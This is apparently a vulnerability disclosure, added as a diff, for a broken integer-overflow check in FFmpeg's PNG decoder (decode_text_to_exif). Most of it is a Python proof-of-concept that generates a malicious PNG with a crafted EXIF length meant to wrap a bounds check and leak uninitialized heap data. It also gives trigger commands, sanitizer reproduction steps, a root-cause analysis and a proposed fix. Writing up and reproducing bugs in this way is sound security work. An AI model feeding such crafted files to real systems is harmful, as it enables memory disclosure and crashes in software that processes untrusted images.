@@ -1,0 +1,171 @@
+Proof of Concept: Broken Integer Overflow Check in pngdec.c decode_text_to_exif()
+
+Overview:
+This PoC crafts a PNG file with a tEXt chunk containing keyword "Raw profile type exif"
+and a specially crafted length value that exploits the broken overflow check at line 561.
+
+Target: 32-bit build of FFmpeg (where size_t is 32 bits)
+The overflow in 2 * exif_len is most impactful on 32-bit platforms.
+
+=== PoC Generator (Python 3) ===
+
+#!/usr/bin/env python3
+"""
+PoC for broken integer overflow check in FFmpeg pngdec.c decode_text_to_exif().
+
+The vulnerability is at line 561:
+    if ((exif_len & ~SIZE_MAX) || end - ptr < 2 * exif_len)
+
+(exif_len & ~SIZE_MAX) is always 0, so the overflow check for 2*exif_len is a no-op.
+
+On 32-bit: exif_len = 2147483656 (0x80000008) causes 2*exif_len to overflow to 16.
+The bounds check passes with only 16+ bytes of input remaining.
+av_buffer_alloc(exif_len - 6 = 2147483650) may succeed on overcommit systems,
+resulting in a huge buffer filled with uninitialized heap data.
+"""
+
+import struct
+import zlib
+
+def make_png_chunk(chunk_type: bytes, data: bytes) -> bytes:
+    """Create a PNG chunk with proper CRC."""
+    chunk = chunk_type + data
+    crc = zlib.crc32(chunk) & 0xFFFFFFFF
+    return struct.pack(">I", len(data)) + chunk + struct.pack(">I", crc)
+
+def make_poc_png() -> bytes:
+    png = b""
+
+    # PNG signature
+    png += b"\x89PNG\r\n\x1a\n"
+
+    # IHDR: 1x1 pixel, 8-bit RGB
+    ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
+    png += make_png_chunk(b"IHDR", ihdr_data)
+
+    # tEXt chunk with crafted "Raw profile type exif" payload
+    keyword = b"Raw profile type exif\x00"
+
+    # Craft the text body:
+    # Line 1: any text followed by newline (skipped by the parser)
+    # Line 2: "exif" marker
+    # Line 3: crafted length value
+    # Line 4+: hex data (intentionally insufficient for the claimed length)
+
+    # On 32-bit size_t: 2147483656 (0x80000008)
+    #   2 * 2147483656 = 4294967312 = 0x100000010 -> truncated to 0x10 = 16
+    #   exif_len - 6 = 2147483650 -> huge allocation
+    #
+    # On 64-bit size_t: use a value that causes 2*exif_len to wrap
+    #   9223372036854775808 + 8 = 0x8000000000000008
+    #   2 * that = 0x10 = 16
+
+    # We provide both 32-bit and 64-bit variants
+    # 32-bit target:
+    crafted_len_32 = "2147483656"
+    # 64-bit target:
+    crafted_len_64 = "9223372036854775816"
+
+    # Use 32-bit value (change to crafted_len_64 for 64-bit targets)
+    crafted_len = crafted_len_32
+
+    # Minimal valid Exif header in hex: "457869662020" = "Exif  " (6 bytes)
+    # Then we need some hex data. We provide minimal data - far less than
+    # exif_len claims, which is the core of the exploit.
+    fake_exif_hex = "45786966202049492a00"  # "Exif  " + TIFF LE header
+
+    # Additional padding hex chars to pass the 2*exif_len=16 bounds check
+    # We need at least 16 bytes remaining after ptr reaches the length field
+    padding_hex = "00" * 20
+
+    text_body = (
+        "exif profile\n"          # line 1: skipped (parser looks for newline)
+        "exif\n"                   # line 2: "exif" marker
+        f"   {crafted_len}\n"      # line 3: crafted length (with leading spaces)
+        f" {fake_exif_hex}"        # line 4: hex data (intentionally too short)
+        f"{padding_hex}"           # padding to satisfy bounds check
+    )
+
+    text_chunk_data = keyword + text_body.encode("ascii")
+    png += make_png_chunk(b"tEXt", text_chunk_data)
+
+    # IDAT: minimal 1x1 red pixel
+    raw_row = b"\x00\xff\x00\x00"  # filter=none, R=255, G=0, B=0
+    compressed = zlib.compress(raw_row)
+    png += make_png_chunk(b"IDAT", compressed)
+
+    # IEND
+    png += make_png_chunk(b"IEND", b"")
+
+    return png
+
+if __name__ == "__main__":
+    poc_data = make_poc_png()
+    with open("poc_pngdec_overflow.png", "wb") as f:
+        f.write(poc_data)
+    print(f"[+] PoC PNG written: poc_pngdec_overflow.png ({len(poc_data)} bytes)")
+    print("[+] Trigger: ffmpeg -i poc_pngdec_overflow.png -f null -")
+    print("[+] Or: ffprobe poc_pngdec_overflow.png")
+    print()
+    print("Expected behavior:")
+    print("  - On 32-bit with overcommit: huge allocation with uninitialized heap data")
+    print("    attached as EXIF metadata (heap information disclosure)")
+    print("  - On 64-bit: allocation failure (ENOMEM), but the broken overflow check")
+    print("    demonstrates the security control bypass")
+    print()
+    print("To verify the broken check, compile FFmpeg 32-bit with ASan:")
+    print("  ./configure --cc='gcc -m32' --extra-cflags='-fsanitize=address'")
+    print("  make -j$(nproc)")
+    print("  ./ffmpeg -i poc_pngdec_overflow.png -f null -")
+
+=== Reproduction Steps ===
+
+1. Save the above Python script as generate_poc.py
+2. Run: python3 generate_poc.py
+3. This creates poc_pngdec_overflow.png
+
+4. Test with FFmpeg (32-bit build recommended for full impact):
+
+   # Basic test - triggers the vulnerable code path
+   ffmpeg -i poc_pngdec_overflow.png -f null -
+
+   # With ASan for detection (32-bit):
+   ./configure --cc='gcc -m32' --extra-cflags='-fsanitize=address -g'
+   make -j$(nproc)
+   ./ffmpeg -i poc_pngdec_overflow.png -f null -
+
+   # With Valgrind to detect uninitialized reads:
+   valgrind --track-origins=yes ffmpeg -i poc_pngdec_overflow.png output.png
+
+5. On 32-bit with overcommit enabled (cat /proc/sys/vm/overcommit_memory == 1):
+   The allocation of ~2GB succeeds, and the buffer is filled with uninitialized
+   heap data that may be exposed via EXIF metadata in the decoded frame.
+
+=== Root Cause Analysis ===
+
+File: libavcodec/pngdec.c
+Function: decode_text_to_exif()
+Line: 561
+
+Broken code:
+    if ((exif_len & ~SIZE_MAX) || end - ptr < 2 * exif_len)
+        return AVERROR_INVALIDDATA;
+
+Problem:
+- exif_len is size_t
+- SIZE_MAX is (size_t)-1, the maximum value for size_t
+- ~SIZE_MAX is (size_t)0
+- exif_len & 0 is always 0
+- The first half of the || is ALWAYS false
+- Therefore the overflow check for 2 * exif_len is completely non-functional
+
+Fix:
+    if (exif_len > SIZE_MAX / 2 || (ptrdiff_t)(end - ptr) < 0 || (size_t)(end - ptr) < 2 * exif_len)
+        return AVERROR_INVALIDDATA;
+
+Secondary issue at line 602:
+    if (ptr > end)  // should be: if (ptr >= end)
+        return AVERROR_INVALIDDATA;
+
+The off-by-one allows one extra iteration of the hex parsing loop when ptr == end,
+potentially leaving a byte partially or fully uninitialized.
